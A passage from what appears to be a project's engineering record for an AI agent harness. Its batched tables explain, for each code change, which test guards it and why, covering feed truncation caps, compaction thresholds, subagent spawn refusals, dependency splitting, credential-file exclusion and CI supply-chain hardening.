| **Truncating the feed instead of refusing it** | `test_a_feed_over_the_cap_is_refused_and_names_the_lever` | `fetch_url` keeps a cut body because cut prose is still prose. A cut Atom document does not parse, so a truncating version raises `ParseError`, retries three times and reports a network failure -- the HTTPS-redirect incident's exact shape |
| **`b"".join(chunks).decode(encoding)` without `errors="replace"`** | `test_a_feed_that_is_not_what_its_encoding_claims_does_not_escape` | `UnicodeDecodeError` is a `ValueError`, which NEITHER `except` clause in `run()` covers, so a feed that is not what its header claims would crash out of the tool on the hostile path. PG5's cut-character concern does not apply: these bytes are always a complete document |
| **Removing `_MAX_AUTHORS`, or deriving `author_count` from the cut list** | `test_the_author_count_is_the_real_total_not_the_kept_count` | The count is the point: a truncated list cannot say whether it came from 26 authors or 2,832. Measured, `authors` was 204,871 of a 223,191-char result -- 91.8% -- and the field TECHNICAL_DEBT 41 never named |
| **Keeping the LAST `_MAX_AUTHORS` names rather than the first** | `test_the_authors_kept_are_the_FIRST_ones` | Passes every count-based assertion and loses the first author, which is the one a citation leads with. `_feed`'s author names are distinct for this reason alone |
| **Reusing `full_summary_url` as the author route** | `test_a_short_author_list_carries_none_of_the_three_keys` | Same URL, but a key named for the summary carrying the author route is a name that lies -- and the summary's key is absent whenever the abstract fit, so the route would vanish for exactly the entries that still need it |
| **Adding a `full_title_url` to "complete the pattern"** | `test_a_long_title_is_flagged_and_given_NO_route` | The asymmetry IS the decision. #49 owes the flag; PG4 exists so the model can reach what it WANTED, and measured over sixty real entries the longest title was 188 characters -- so a title past 300 is a malformed feed, and pointing the model at its abs page answers a question nobody asked |
| **Raising `MAX_TITLE_CHARS`, `MAX_CATEGORIES` or `_MAX_AUTHORS`** | `test_the_caps_are_what_the_record_says` | PG8's rule, unchanged: the fix for a value the model cannot tell was cut is the flag, not a larger cap and not a knob. PG8 forbids RAISING a cap; it never meant no cap may be ADDED, which is what #131 requires wherever model-facing third-party text is unbounded |
| **Changing `len(all_categories) > MAX_CATEGORIES` to `>=`** | `test_a_category_list_exactly_at_the_cap_is_not_called_cut` | A SURVIVING MUTATION added that test (F10): `authors` and `title` each had a boundary case and `categories` did not, so the cut case used 30 and the uncut case 3 and neither could see 20. It flags a list as cut when nothing was cut -- PG8's complaint inverted |
| **`_feed`'s three new keyword arguments** | Nothing -- they default to what it built before them | Twelve existing callers, none changed. `title_chars=None` keeps the short `Paper <n>` title, because a test about paging should not have to think about a title |
| **`test_redirects_are_followed` patching `httpx.get`** | It did, and the switch made the patch inert | It failed loudly (`assert None is True`) rather than going green, because the assertion reads the dict the patch fills. The double is a context manager with `iter_bytes` now, which is the shape the bound is implemented against |
| **`test_httpx_get_does_not_follow_redirects_by_default` checking only `get`** | Its own message names arxiv's explicit `follow_redirects` | With `arxiv.py` moved to `stream`, nothing in production called `httpx.get` -- a conformance check pointed at an API the project no longer uses. It checks both now, and a divergence between them is itself worth failing on |

## Batch 127 -- three bounds, each checked against one of two siblings (TECHNICAL_DEBT 42, 46, 47)

| Change | What breaks | Why it is correct |
|---|---|---|
| **Removing `derived_trigger`'s dependent floor** | `test_no_window_derives_a_trigger_the_validator_refuses` (nine windows) and `test_a_provider_reported_small_window_no_longer_kills_every_turn` | TECHNICAL_DEBT 42. `effective_compaction` validates the trigger against two settings of identical form, and the derivation could produce a value failing one of them. `should_compact()` runs at the top of every step and both `_maybe_compact` call sites are bare `yield from`, so this was not a mistimed fold -- every turn on a model whose provider reports 8,192 died before the first model call |
| **Hardcoding the floor as `8_001`** | `test_the_floor_is_read_from_the_settings_and_not_written_in` | Correct today and wrong the moment someone edits `config.yaml:830`. `_dependent_floor()` reads the SAME resolution the validator reads, so the floor cannot drift from the number it exists to satisfy. This is item 41's lesson applied to the fix and not only to the register entry |
| **`min(margin, keep_recent)` instead of `max`, or dropping the `+ 1`** | `test_the_floor_tracks_whichever_dependent_floor_is_larger` and the nine-window case | Both validators demand STRICTLY below, so the smallest acceptable trigger is one above the LARGER of the two. `keep_recent_tokens` never bites first under the shipped numbers, which is exactly what made checking only it read as covered -- so the test moves it above the margin rather than trusting today's values |
| **Letting `_dependent_floor()` propagate its own read failure** | `test_the_floor_falls_back_rather_than_becoming_the_blocker` | A settings.json naming a small `trigger_tokens` makes `effective_compaction()` raise on the way to reporting the margins, and `derived_trigger` has callers outside `thresholds()`. A floor that cannot be computed must never become the reason a thread cannot compact |
| **Asserting the boundary as "the floor stops applying above 10,667"** | `test_the_boundary_between_derived_and_floored_is_exact` | The raw curve is FLAT in places: `headroom_for` truncates, so the trigger gains 3 tokens per 4 of window and 10,667 and 10,668 both derive 8,001. The first window strictly above the floor is 10,669. Measured -- the first draft of that test asserted 10,668 and was wrong twice |
| **Restoring `test_the_floor_cannot_eat_a_small_window_whole`'s old last clause** | Nothing, which is the point of this row | It named `effective_compaction()` raising *"or one under keep_recent_tokens"* while asserting `trigger > 0`, and 8,192 is in its own window list. The clause was REMOVED rather than asserted, because no clamp on `headroom_for` can deliver it -- at `0.75*window` the raw trigger clears 8,000 only from 10,667 up. The claim lives with `derived_trigger`, where the floor is |
| **Reverting `all_categories` to `[c.get("term") for c in ...]`** | `test_a_termless_category_is_dropped_the_way_a_nameless_author_is` and `test_the_two_lists_agree_about_a_malformed_element` | TECHNICAL_DEBT 47. `authors` dropped a nameless entry with a comment stating why and `categories`, two lines below, kept the `None`. Both come from the same attacker-influenced feed and reach the model the same way |
| **Filtering either list AFTER the cut** | `test_the_two_lists_agree_about_a_malformed_element` | The cap must count values the model can use; filtering after the slice lets a nameless element consume one of the 25 or 20 places |
| **Adding a breadth cap to `check_output_policy`'s `_walk`** | Nothing -- and this row exists so the measurement is not re-litigated into a feature | TECHNICAL_DEBT 46, CLOSED as the wrong axis. Measured: cost is `a*leaves + b*bytes` with both terms real -- at 2,000,000 bytes held constant, 20 leaves cost 19.65ms and 200,000 cost 351.20ms; at 2,832 leaves held constant, 10 chars each cost 4.89ms and 10,000 each cost 289.58ms. A breadth cap does not BOUND the function, since 20 leaves of arbitrary length passes it; a total-size bound does, since leaves cannot exceed bytes. The producer-side gap it points at is item 48 |
| **Containing the `ValueError` at the `_maybe_compact` call sites** | Nothing, and it was rejected rather than overlooked | Compaction would then silently never run on that model, which is the quiet-failure class this project keeps closing. The defect is the unusable value, not the missing `try`. The usage line at `tui/app.py:3222` catches deliberately, for the different reason that a usage line must not kill a turn |
## Batch 128 -- the context file's own claims, measured

| Change | What breaks | Why it is correct |
|---|---|---|
| **Editing the `read_project_doc` bound sentence in `AGENTS.md` without re-measuring** | `test_the_documented_doc_read_bound_is_not_understated` | The count is exact and the size is a ceiling. If the gate goes red because the number went UP, read the paragraph before retyping the figure: it is about a security bound, and understating one is the direction that costs something |
| **Adding a document at depth 0-3 that `is_readable_doc` admits** | the same gate, on the COUNT | Correct and intended. A new `.md`/`.rst`/`.txt` or named build file widens what every research pass can read, so it is a deliberate edit to that sentence rather than a silent one |
| **Narrowing that gate's walk, or dropping its `is_readable_doc` call** | the same gate, on its own | Both scored KILLED as TYPE A mutations. A check whose passing condition is "the number matched" cannot notice that it looked in fewer places -- the domain is mutated, not only the assertion |
| **Relaxing `count == stated_count` to `>=`, or the ceiling to a multiple** | nothing, until a negative control breaks the document | TYPE B: the measurement is unchanged and the gate simply stops REJECTING. Proved by red-with-a-broken-document before and green-with-the-same-document after; this is why the six controls in `controls128.py` are part of the batch and not a convenience |
| **Adding a `Test*` class to `tests/test_tui.py`** | `test_agents_md_states_the_real_test_tui_class_count` | The stated cost of the owner's gate-everything decision. One digit, in the FLOOR-BOUND paragraph. The count rising is the loadscope rule working |
| **Counting `^class ` instead of `Test*` in that gate** | the gate itself, immediately | That file holds seven helper classes alongside the 64 pytest collects, so the looser count is 71 and matches nothing |
| **Adding a modal case or a terminal size to `TestTheSameScreensWithContentThatOverflows`** | `test_agents_md_states_the_real_modal_parametrisation` | `_DECISION_CASES` is `_modal_cases() + _overflowing_modal_cases()`, computed, so the gate counts COLLECTED NODE IDS. Update `3 sizes x 19 cases = 57` and keep it a true product -- the gate checks the arithmetic separately, which is why a self-inconsistent edit fails for a different reason than you expect |
| **Adding or removing a name in `_ALLOWED_NAMES`, or a node in `_ALLOWED_NODES`** | `test_agents_md_states_the_real_sympy_allowlist_sizes` | Both are module constants and both are gated exactly. Widening either is "a decision about a KIND of thing" per the `safe_parse` rules, so the document moving with it is the point |
| **Turning that gate's `dir(sympy)` window into an equality** | nothing locally, and a red run on another machine | `dir()` on a PACKAGE grows as submodules import: `probability_stats.py` imports `sympy.stats`, so the count is 926 or 927 in the same checkout depending on what loaded first, and 928 under an unpinned SymPy. The window is deliberate; `abs(live - stated) <= 5` is the claim |
| **Relaxing `_one_number`'s `len(found) == 1` to `>=`** | nothing, until two sentences match the pattern | Then the gate silently reads the first and calls it authoritative. Scored KILLED only once its control duplicated the figure UNCHANGED -- with a different number the count assertion catches it, which probes a different guard |
| **Re-loosening `mcp==2.2.0` to `mcp>=2.0,<3`** | nothing in the suite, and CI on a schedule nobody controls | `requirements.txt` carries the history: under the range a minor release went red on main while every local run stayed green. `AGENTS.md` stated the range until batch 128, which is how a document invites the defect back |
| **Restoring "`real_storage` is the suite's only non-function-scoped fixture"** | nothing -- and that is the point of this row | It was false from batch 110, in `AGENTS.md` and in this file, and no test could see it. `grep -rn 'scope="module"' tests/` returns `real_storage` AND `_schema_cache_is_put_back`. The RULE both sentences support is unchanged: one FILE has the problem, so that file declares no test class |
| **Re-adding a `file.py:NNN` citation to `AGENTS.md`** | nothing, and it is still wrong | That file carries zero line-number citations in 2,891 lines, which is why none of batch 128's drift was a line number. Cite the symbol |
| **Removing `PATHEXT` from `_SAFE_ENV_KEYS`** | `test_the_fallback_shell_is_given_pathext`, and `test_a_real_program_is_reported_with_its_own_exit_code` under `-m integration` | Batch 130. Without it `powershell -c "& 'prog' args"` starts an external program and returns immediately, so the fallback reports `return_code=0` and empty output 0.37s after launch while the work is only starting -- and the wall clock, the route's one bound on Windows, is gone before it. Measured: 1 of the 65 names `_scrubbed_env()` drops changes this, and PowerShell builtins never show it, so a probe using `Start-Sleep` reads the route as healthy |
| **Making `_run_subprocess_fallback` pass anything but `_scrubbed_env()`** | `test_the_fallback_shell_is_given_pathext` | Batch 130. The guard asserts the `env=` kwarg handed to the real `subprocess.run`, not what `_scrubbed_env()` returns in isolation, so the wiring is what it measures -- scored KILLED on `env=None` |
| **Dropping the `rewritten` out-parameter from `safe_parse`, or any tool's `symbols` schema field** | `TestASplitSymbolNameIsReportedRatherThanAnswered`, incl. `test_every_parsing_tool_can_declare_a_symbol` | Batch 131. `split_symbols` rewrites a multi-character name into a product of single letters BEFORE anything is computed, so `determinant([[mass,0],[0,mass]])` returned `a**2*m**2*s**4` as a successful result with no marker distinguishing it from a correct one. `symbols=` is the only defence and three of the four parsing tools could not reach it. The schema field is what makes the remedy reachable by the only caller there is |
| **Deleting any one of `_rewritten_names`' three exclusions** | `test_a_name_that_was_not_split_stays_silent`, `test_a_name_that_cancels_out_of_the_result_is_judged_on_what_it_was`, `test_a_function_call_and_a_float_literal_are_not_names` | Batch 131. Each exclusion has exactly one reason: one character cannot be split, an `_ALLOWED_NAMES` entry is a binding the caller may have meant (`E` is Euler's number), and a declared name is already protected. All three scored KILLED -- but the declared-name row was EQUIVALENT until its test stopped asking `linear_algebra`, where `safe_parse` runs per CELL and a declared name always survives its own parse. Test it where the name CANCELS inside one parse (`symbolic_math.evaluate('mass*0')`) or the clause is undefended |
| **Citing a marathon finding id (`S06-01`, `S11-01`, ...) in a production comment** | `test_every_decision_id_cited_in_production_code_resolves` | Batch 131. `_CITATION`'s lookahead permits a following hyphen, so `S06-01` is read as the decision id `S06` and resolves nowhere -- and `S11`/`S12`/`S16` are already claimed by the record's "Rev. 1 open question" namespace, so three of the fix pass's six scopes collide with a REAL id. Cite the batch in code, per this project's existing idiom, and leave the finding ids in DEVLOG, this file and the triage index |
| **Passing a raw `input_schema` dict to `FunctionDeclaration(parameters=...)` again** | `test_every_advertised_SCHEMA_constructs_against_the_REAL_pinned_types` | Batch 132. `types.Schema` is `extra="forbid"`, so a JSON Schema key it has no field for is a `ValidationError`, and the translation is one comprehension over every schema -- one refusal takes all 15 and NO model call on GOOGLE can be built. `probability_stats`' `Optional[dict[str, float]]` renders `additionalProperties` and is the entry that does it. The old coverage ran against the conftest's fake `genai`, which accepts anything, so the suite was green throughout |
| **Narrowing `_reduce_for_google` until it returns less than it must** | `test_the_google_reduction_keeps_the_shape_it_is_allowed_to_keep` | Batch 132. A reduction that returned `{}` would make GOOGLE "work" by sending empty schemas, and the construct-it test alone would still pass -- scored KILLED as mutation A4. The shape test pins that an ordinary field is byte-identical, `Optional[X]` becomes X plus `nullable` with its description, and only the unrepresentable key is lost |
| **Computing the accepted-key set at import time, or writing it down** | `test_the_google_reduction_keeps_the_shape_it_is_allowed_to_keep` (the `anyOf`/`any_of` assertion) | Batch 132. The root `conftest.py` puts a fake `google.genai` in `sys.modules` before collection, so an import-time constant binds the FAKE's fields for the whole session. And the set needs both halves: JSON Schema spells it `anyOf` while the model field is `any_of`, so dropping the aliases stops the nullable union being recognised at all -- scored KILLED as mutation A6 |
| **Letting the fake `types.Schema` drift from the pinned `google-genai`, or deleting it** | `test_the_FAKE_schema_carries_the_same_keys_as_the_REAL_one` | Batch 132. `_google_schema_keys` reads `model_fields` to decide which JSON Schema keys the SDK can carry, so the offline suite needs a fake that has them. Deleting it is an `AttributeError`; an EMPTY field set is worse, because the reduction then strips every key and `test_client_translation.py` passes against schemas production would never send. Do NOT "fix" that by making the production code tolerate a missing `Schema` -- that turns the fix off in exactly the case it exists for |
| **Adding a key to `agents/subagent_tool.py`'s `common` dict without adding the parameter to BOTH entry points** | `test_every_common_key_is_a_parameter_of_BOTH_entry_points` | Batch 133. The dict is shared between a child's first turn and every wake after it, on purpose, so a key only one side takes is a `TypeError` on every call of the other -- which is what section 61's CN7 shipped for `cancel`/`wake_conversation`: every subagent wake turn raised, 100% of the time, discarding a completed agent run. Invisible to `test_session_subagent.py`/`test_session_cli.py`, which patch the entry point with `**kwargs` and no `autospec` |
| **Listing `common`'s keys in that test instead of reading them by AST** | nothing, and that is the point | Batch 133. A hardcoded list passes for the next argument added, which is the exact failure the test exists to catch. The two vacuity guards (at least eight keys found, exactly two `**common` spreads) are what stop an AST walk that silently matches nothing |
| **Putting the sub-turn fold back behind `cutoff < 1` alone** | `test_a_long_turn_BEHIND_a_completed_one_still_folds_inside` | Batch 134. `completed_turns()` is at least 1 for any thread with two user rows, so that guard made the sub-turn path unreachable on the common shape -- a long turn behind one completed exchange folded 0.0%, turn-aligned, then answered `no-progress` forever at `logger.debug` with no notice and nothing on screen. The gate is now "no turn-aligned fold WORTH a model call": kept when it frees at least `keep_recent_tokens` |
| **Turning that floor into a "fold whichever is bigger" comparison** | `test_a_turn_aligned_fold_that_clears_the_floor_is_still_preferred` | Batch 134. Both rules unstick the thread; only the floor preserves batch 120's last-resort ordering, under which a turn-aligned boundary wins because it needs no row re-added and no amendment to M5. Scored KILLED as mutation A4 (floor made infinite), which the two-turn case alone does not catch |
| **Writing a compaction test against `OVERRIDES` when the claim is about a FLOOR** | nothing -- and that is why it is here | Batch 134. `OVERRIDES` sets `keep_recent_tokens: 1`, and the gate's floor IS keep_recent_tokens, so a nine-token fold clears it and the defect is unreachable. The first version of the two-turn test passed for exactly that reason. Set a floor meaningful relative to the thread, as both new cases now do |
| **Removing the `try` around `commands.dispatch(...)` in `on_prompt_input_submitted`** | `TestARaisingCommandDoesNotKillTheApp::test_the_app_survives_and_the_transcript_says_so` | Batch 135. The handler runs on the UI thread inside a message handler, so its exception reaches Textual's `_handle_exception` and exits the whole application -- transcript, thread view and session. Reachable by one mistyped line in a file a project ships (a non-string `additional_tools` element crashes `/skill`). Contained at the CALL SITE, not in the registry: the registry is mechanism, the policy is the shell's |
| **Containing `dispatch` in a way that also swallows its return value** | `TestARaisingCommandDoesNotKillTheApp::test_a_working_command_is_unaffected` | Batch 135. Then every command reports failure, and the survival assertion cannot see it -- scored EQUIVALENT without this control and KILLED with it (mutation A4). `/help` through the same path must write nothing to the error channel |
| **Removing the `try` around `command.complete(rest)` in `matching()`** | `TestARaisingCommandDoesNotKillTheApp::test_a_raising_completer_offers_no_rows_instead_of_crashing` | Batch 135. Same exposure on a hotter path -- once per keystroke, on the UI thread -- so a raising completer killed the app while the user was still typing. Contained INSIDE `matching()` unlike `dispatch`, because "offer nothing" is that function's own answer and there is no policy to hand upward |
| **Registering a command in a `test_tui.py` test without popping it** | nothing, and it corrupts every later test in the file | Batch 135. `_commands`/`_aliases` are module-global on one shared registry and `--dist loadscope` keeps the whole file in one process, so a leftover probe command is offered by `/help` and the suggestion panel afterwards -- `test_a_bare_slash_offers_everything_help_lists` starts disagreeing with itself for a reason nothing names |
| **Adding a test package to `requirements.txt`** | `test_no_test_package_is_a_runtime_dependency` | Batch 136 (S18-07). `pyproject.toml` reads that file for `[project].dependencies` via `dynamic`, so anything in it is a hard requirement of the published package AND of every venv `bin/venastine.mjs` builds -- which is how pytest, pytest-mock, pytest-asyncio, pytest-xdist and execnet were shipping to end users. Test packages go in `requirements-test.txt` |
| **Removing `defusedxml` from `requirements.txt`** | `test_no_test_package_is_a_runtime_dependency` (its second assertion) | Batch 136. It is a PRODUCTION dependency -- `tools/builtin/arxiv.py` imports it at module load -- and it sat under a "Test dependencies" heading for twenty batches, which is exactly how it would be tidied away by mistake. TECHNICAL_DEBT 18 predicted this; the prediction was right about the risk and wrong about the mechanism |
| **Letting `requirements-test.txt` and pyproject's `test` extra drift** | `test_the_test_extra_matches_requirements_test` | Batch 136. Two copies are the deliberate trade, because setuptools' `optional-dependencies` is all-or-nothing and making `test` dynamic would force `documents` and `pdf` into files too. The gate compares requirement STRINGS, not names, so a floor raised in one file alone is caught -- scored KILLED as mutation A3 |
| **Adding a workflow that runs pytest without `requirements-test.txt`** | nothing in the suite -- the job just fails | Batch 136. Five sites (`tests.yml` x2, `compat.yml` x2, `publish.yml`) used to get pytest by accident, because it was a runtime dependency. Check the pairing both ways: every workflow that runs pytest installs the test file, and none that does not |
| **Removing the `spawnable` clause from `refusal_reason`** | `TestSpawnableRefusesAndDoesNotOnlyHide` | Batch 137 (A16, ROADMAP_v3 §62). Without it `spawn_subagent` spawns any agent the loader discovered, by name, including one A3 deliberately left off the catalog -- so the catalog says absent and the tool says yes. Silence at the user and project tiers then buys INVISIBILITY rather than unreachability, which ranks an adversarial author above a careless one |
| **Comparing `spawnable` with anything but `is not True`** | `test_an_undeclared_agent_is_refused_at_the_stranger_tiers`, `test_a_declared_spawnable_agent_still_spawns` | Batch 137. `None` is undeclared and `False` is declared-off, and A3's reading is that both get the safe answer -- so `is False` lets every undeclared stranger-tier agent through (scored KILLED as mutation A3) and inverting it refuses the six that ship |
| **Restoring "is not in the available agents catalog" to the unknown-agent refusal** | `test_the_unknown_message_no_longer_claims_the_CATALOG_decides` | Batch 137. `manager.get` reads the ROSTER; `agent_catalog_text()` is the catalog. The message named a test that was not being run -- shape 9 inside the function that owns the contract -- and the fix was due whichever way A16 had gone |
| **Adding a `spawn_targets` entry for a non-spawnable agent** | `test_every_shipped_spawn_target_is_itself_spawnable` | Batch 137. Under A16 that is a route which can never fire: the parent is told it may spawn something the refusal blocks. Swept over the whole roster rather than asserted of `plan` by name, which is how A13 broke -- batch 51 added `build` and a comment claimed a superset the whitelist never gained |
| **Adding a tracked file that `read_project_doc` can reach** | `test_the_documented_doc_read_bound_is_not_understated`, but **only after the commit** | Batch 137, learned from 136. The gate counts TRACKED files, so a new file raises the bound only once it is staged -- a pre-commit full suite is green and the committed state is red. `requirements-test.txt` took it 61 -> 62. Read before bumping: the paragraph is about a security bound and the gate says so |
| **Spawning a non-spawnable agent in a test, or patching only `get_agents`** | the test loses whatever it was measuring; A16 refuses the spawn | Batch 137. `test_grants.py`, `test_review.py` and `test_thread_legibility.py` all drove `subagent_tool.run` with `grill-me` (`spawnable: false`). Retargeting found two things: `test_review`'s assertion was vacuous, because `grill-me` declares no `spawn_subagent` for the parent's restriction to suppress; and the spawn SIGN-OFF has an empty candidate set for all six spawnable shipped agents, so it was reachable only through the defect -- use a spawnable fixture that declares no narrowing. `manager.get` reads `get_agent(name)` and the catalog reads `get_agents()`: patch both or the fixture is refused and it looks like A16 working |
| **Giving a spawnable shipped agent `write_project_doc`** | `test_no_spawnable_shipped_agent_offers_a_signoff` | Batch 138 (TECHNICAL_DEBT 83). **Going red here is not a regression** -- it means §18's spawn sign-off is reachable on a stock install for the first time, because `write_project_doc` is the only gated-and-grantable tool global policy allows and no spawnable agent declares it. Read item 83, which names the three ways to resolve it, then update or close the entry rather than reverting the declaration |
| **Correcting the mechanism: the sign-off's candidates are NOT globally denied** | nothing -- this row exists because the previous one in this file said so | Batch 138. Batch 137's row above records the empty candidate set and implies denial as the cause. Measured: `write_project_doc` is `is_tool_allowed` True on a stock install, and what excludes it is that none of the six whitelists names it. `write`/`edit` are denied and `shell` plus the file tools are filtered by §25 R2 as per-call, so neither is the operative reason. An entry is evidence, not instruction -- including one written three days ago |
| **Listing the spawnable agents by name in that sweep** | nothing, and that is the point | Batch 138. A hand-written roster is how the check stops covering the seventh agent, which is the shape item 79 files against a doc gate and the shape A13 broke in batch 51. The sweep reads `agent.spawnable is True` off the roster and guards its own reach with `len(spawnable) >= 5` |
| **Deleting `test_a_spawnable_agent_declaring_it_would_offer_one`** | nothing locally -- the sweep goes vacuous and stays green | Batch 138. That control drives the same helper through a synthetic spawnable definition declaring the one grantable tool, so a `candidate_approvals` that answered `[]` unconditionally is caught. Scored: mutation A3 (`return []`) is KILLED by the control and by the vocabulary test, and the sweep alone would have passed it |
| **Removing `grantable()` from `candidate_approvals`** | `test_research_authorization.py::TestCandidates::test_the_pipeline_offers_a_subset_of_what_the_signoff_does` -- and **not** the test that says it pins it | Batch 138 (TECHNICAL_DEBT 84), found by this batch's mutation pass. `test_grants.py`'s `test_the_signoff_never_offers_a_param_gated_tool` asserts an empty intersection with `{shell, write, edit, read}`, all four globally denied, so `_advertised` drops them before `grantable()` is consulted -- the filter's removal leaves all 56 tests in that file green. Its docstring calls `wide.allowed_tools = None` "the widest case the filter ever sees"; that removes the AGENT narrowing, not the global denial. The filter is load-bearing on an operator-enabled install, so do not delete it -- fix the test, per item 84's shape |
| **Asserting worker-thread state after a raw `pilot.pause()` in `tests/test_tui.py`** | nothing, until a slow run turns it red for somebody else | Batch 138 (TECHNICAL_DEBT 85). `pause()` costs 21ms idle and 1021ms with one busy sibling thread -- a 46x swing measured at `tests/conftest.py:249-250`, because its exit condition is a process-wide CPU heuristic -- so a wait that covers a cross-thread handoff on an idle box does not on a loaded one. `test_quitting_by_gesture_releases_a_blocked_worker` failed once in a 635s run and passed alone, under `-n0`, and across all 443 tests of its own file in parallel. Six sites have the shape. Use `await settle(pilot, <the predicate the assertion already states>)` and keep `pump` for negative assertions, which is the distinction `test_pilot_wait.py` exists to hold |
| **Giving a spawnable shipped agent a gated-and-grantable tool** | `test_request_payload_offers_nothing_for_every_shipped_agent` | Batch 139 (TECHNICAL_DEBT 83, ruled). **Red here is not a regression:** it means `SubagentSignoffScreen` takes its PICKER branch for a shipped agent for the first time, so §18's subset sign-off became reachable on an install that is not operator-configured. The ruling is that the picker is for operator-configured installs, so update item 83 and the four places recording the scope rather than reverting the declaration |
| **Dropping the child context from `candidate_approvals`** | `test_the_picker_is_reachable_only_for_an_agent_that_declines_to_narrow` and the end-to-end test | Batch 139. The intersection with the CHILD's reachable tools is the whole mechanism: the pool is the MCP tools plus `write_project_doc`, and every spawnable shipped agent narrows `allowed_tools` to built-ins. Without the argument all six are offered an MCP tool they cannot call -- the notice over-promising, which `candidate_approvals`' own docstring calls worse than not offering it. Scored KILLED as mutation A1; #71 (M7) is the same mutation found by sweep rather than by a mutation pass |
| **Asserting only that `request_payload` carries no candidates** | nothing -- and the mutation pass is how that was measured | Batch 139. A `candidate_approvals` returning `[]` unconditionally satisfies `assert payload["candidates"] == []` perfectly, so the end-to-end test ALONE is the vacuity it exists to close: mutation A3 killed the reachability test and left the end-to-end one GREEN. The pair is the guard -- one drives the production entry point, the other proves the helper answers non-empty for a configuration that occurs |
| **Opening a line in a RECORD document with `**` and an id-shaped token** | `test_the_map_names_every_family_the_record_defines` | Batch 139. `_DEFINITION_LEAD` is `^\s*(?:[-*]\s*)?\*\*([A-Z]{1,2}\d+[a-z]?)\b`, so a bold run at the start of a line DEFINES a decision family. A paragraph opening `**AC1b's SCOPE...` declared a family `AC` that AGENTS.md's namespace map does not name, and the gate failed on it; `**The SCOPE of AC1b...` is the fix. Batch 131 hit the CITATION half of this gate (`S06-01` read as the decision id `S06`), and this is the definition half -- in a record document an id-shaped token is never just prose |
| **Adding a credential-bearing file the harness writes, without a `neverDistribute` entry** | `test_every_never_distribute_entry_is_well_formed_and_drivable` and the two channel gates | Batch 140 (S18-01/S18-08). `package.json`'s `neverDistribute` is the one list all three exclusion channels read. An entry needs `samples` -- concrete paths the gates drive -- so a pattern cannot be added without a demonstration that it covers something. Before this the rule had FIVE copies and no two agreed: `secrets.json` was in both git channels and neither npm list, and `.venastine/mcp.json` was in none of the five while `/init --config` writes it |
| **Excluding `.venastine/` wholesale instead of the two config files** | the positive control in `test_the_push_channel_ignores_every_sample_that_claims_it` | Batch 140. The directory also holds project-tier `agents/` and `skills/`, which are MEANT to travel with a repository -- `config_loader` discovers them with it and D17's trust prompt exists for exactly that. Excluding the directory makes that feature dead on arrival, so the gate asserts `.venastine/agents/example.md` stays trackable. The two credential files are excluded by name |
| **Giving `prepublish-check.mjs` its own denylist again** | `test_the_npm_gate_derives_its_denylist_rather_than_restating_it` | Batch 140. That inline copy is where `secrets.json` went missing and where `f.endsWith('.db')` failed to cover `app.db-wal` -- the defect both git channels had already been fixed for and commented. The gate checks for the literal as well as for the shared read, because a gate that only compared lists would pass the moment one was re-inlined |
| **Adding a `match` kind to `neverDistribute` with no matcher in the mjs** | `test_the_npm_gate_derives_its_denylist_rather_than_restating_it` (its kinds assertion) -- and otherwise `npm publish` itself | Batch 140. The consumer THROWS on an unknown kind rather than skipping it, deliberately: a denylist that silently stops enforcing a pattern is the defensive-default shape S18-02 files against the bandit baseline. Correct behaviour, terrible moment to discover it, hence the gate |
| **Building an archive-channel check on `git check-attr export-ignore`** | nothing -- and it would report two WORKING entries as broken | Batch 140, measured in a throwaway repository. `logs/ export-ignore` makes `git archive` exclude `logs/a.txt` while `check-attr` reports `unspecified` for both `logs` and `logs/a.txt`: archive prunes the tree ENTRY and attributes apply to files. Driving `git archive` is faithful and vacuous instead -- it ships only TRACKED content and every path here is untracked. So the gate reads the patterns with `fnmatch`, whose `*` crosses `/` where git's does not, which is the permissive direction and cannot produce a false red |
| **Restating a computed count in prose next to the thing that computes it** | nothing, and it is the copy that drifts | Batch 140 (S18-09). `bin/venastine.mjs` said the consent prompt "runs a network install of 17 pinned distributions" beside a screen printing the live number. The file had 22 installable lines when the finding was written and 18 now, because batch 136 moved the pytest packages to `requirements-test.txt` -- so the review's own figure went stale inside three days. `countPins` is now `countRequirements`: it counts non-comment lines, 2 of the 18 are ranges, and "pinned" is a promise on the one screen where the user is agreeing to something |
| **Adding a `uses:` line with a tag instead of a commit SHA** | `test_every_action_reference_is_pinned_to_a_commit` | Batch 141 (S18-05). All 24 were floating major tags, including the three in `publish.yml` -- the job with `id-token: write` and, once the secret exists, `NODE_AUTH_TOKEN`. A tag is a mutable ref owned by a third party. The trailing `# vX.Y.Z` is required too: a bare 40-hex is unreadable in review and the comment is what Dependabot rewrites in place. The rule was already stated in `gitleaks.yml` ("D22's exact-pin rule applies to CI tooling too") in a file whose own checkout floated |
| **Removing the `github-actions` block from `dependabot.yml`** | `test_dependabot_can_update_a_pinned_action` | Batch 141. SHA pins with no update channel are pins that never move again, which trades one risk for another. Grouped, per that file's own argument: one diff the suite adjudicates once |
| **Moving `publish.yml`'s secret scan, or running it before the providers.json removal** | `test_the_publish_path_scans_for_secrets_before_publishing` | Batch 141 (S18-03). The job declares no `needs:` and reads no other workflow's verdict, so gitleaks ran CONCURRENTLY with publishing and `npm publish` cannot be undone -- measured on v0.2.0: two runs, tests and publish, no scanner. The ordering half matters as much: the job copies `providers.json.example` in for the suite, so scanning earlier scans a planted fake and passes only because `gitleaks.toml` allowlists the name. `--source` stays RELATIVE or every `.gitleaksignore` fingerprint stops matching |
| **Dropping `scripts/bandit-count-check.py` from `bandit.yml`** | `test_the_bandit_job_checks_counts_as_well_as_the_baseline` | Batch 141 (S18-02). `-b` suppresses by (file, test id, MESSAGE), not by call site, so a second subprocess call in a file already carrying a baselined B603 is silent -- `security/sandbox.py` went 7 -> 18 across this branch with the job reporting nothing. The gate asserts the INVOCATION, not the script's name: the comment above the step names it too, and mutation A5 survived the first version for exactly that |
| **Auditing only one requirements file in `pip-audit.yml`** | `test_pip_audit_covers_every_declared_dependency_file` | Batch 141 (S18-04). Its header called `requirements.txt` "the one dependency list", which batch 136 made false by splitting the suite's packages out -- so four distributions were audited by nothing. Both files now, both in the cache key, and `pull_request` filtered to those two paths so a dependency change audits itself |
| **Writing `# nosec B603,B607` without a space** | nothing -- it suppresses only B607, silently | Batch 141, measured. The comma-without-space form parses as one token; `B603, B607` and `B603 B607` both work. Four annotations in the triage did less than they said because of it. Bandit 1.9.4 accepts the comment anywhere in a statement's line RANGE, which is why two of the eighteen sandbox sites report their `shell=False,` argument rather than the call's first line |
